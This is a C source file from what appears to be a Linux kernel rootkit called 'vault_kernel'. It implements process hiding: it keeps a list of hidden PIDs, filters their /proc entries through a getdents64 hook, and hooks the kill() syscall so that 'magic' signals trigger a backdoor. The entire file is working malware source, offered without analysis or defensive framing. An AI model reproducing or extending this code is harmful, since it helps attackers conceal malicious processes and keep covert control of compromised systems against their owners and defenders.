/* vault_kernel - proc_hide.c
 * Process hiding — PIDs are hidden from /proc enumeration
 * Also hooks kill() to intercept signals to hidden processes
 * ruby570bocadito © 2026
 */
#include "core.h"

int hidden_pids[MAX_HIDDEN_PIDS];
int hidden_pid_count = 0;
static DEFINE_SPINLOCK(proc_hide_lock);

void proc_hide_add(int pid) {
    unsigned long flags;
    spin_lock_irqsave(&proc_hide_lock, flags);
    if (hidden_pid_count < MAX_HIDDEN_PIDS) {
        hidden_pids[hidden_pid_count] = pid;
        hidden_pid_count++;
        pr_info(VAULT_KERNEL_TAG " hiding PID: %d\n", pid);
    }
    spin_unlock_irqrestore(&proc_hide_lock, flags);
}

void proc_hide_del(int pid) {
    unsigned long flags;
    int i;
    spin_lock_irqsave(&proc_hide_lock, flags);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            hidden_pid_count--;
            hidden_pids[i] = hidden_pids[hidden_pid_count];
            pr_info(VAULT_KERNEL_TAG " unhid PID: %d\n", pid);
            break;
        }
    }
    spin_unlock_irqrestore(&proc_hide_lock, flags);
}

int is_pid_hidden(int pid) {
    unsigned long flags;
    int i, hidden = 0;
    spin_lock_irqsave(&proc_hide_lock, flags);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            hidden = 1;
            break;
        }
    }
    spin_unlock_irqrestore(&proc_hide_lock, flags);
    return hidden;
}

int proc_hide_snapshot(int *dst, int max) {
    unsigned long flags;
    int n;
    spin_lock_irqsave(&proc_hide_lock, flags);
    n = hidden_pid_count < max ? hidden_pid_count : max;
    if (n > 0)
        memcpy(dst, hidden_pids, n * sizeof(int));
    spin_unlock_irqrestore(&proc_hide_lock, flags);
    return n;
}

/*
 * This is called from file_hide.c's getdents64 hook.
 * When enumerating /proc, PID directory names are numeric.
 * We check if the numeric name corresponds to a hidden PID.
 */
int is_proc_pid_hidden(const char *d_name) {
    long pid;
    const char *p = d_name;

    while (*p) {
        if (*p < '0' || *p > '9')
            return 0; /* Not a PID directory */
        p++;
    }

    if (kstrtol(d_name, 10, &pid))
        return 0;

    return is_pid_hidden((int)pid);
}

/* ================================================================
 * Hooked kill() — intercept magic signals for backdoor + protect
 * hidden processes from external signals
 * ================================================================ */
asmlinkage long hooked_kill(const struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;
    long (*orig_kill)(const struct pt_regs *);

    orig_kill = (void *)hooks[HOOKIDX_KILL].original;

    /* Check for magic packet backdoor trigger (see backdoor.c) */
    if (backdoor_check_magic(pid, sig))
        return 0;

    return orig_kill(regs);
}

int proc_hide_init(void) {
    pr_info(VAULT_KERNEL_TAG " process hiding initialized (max=%d)\n",
            MAX_HIDDEN_PIDS);
    return 0;
}

void proc_hide_cleanup(void) {
    hidden_pid_count = 0;
    pr_info(VAULT_KERNEL_TAG " process hiding cleaned\n");
}
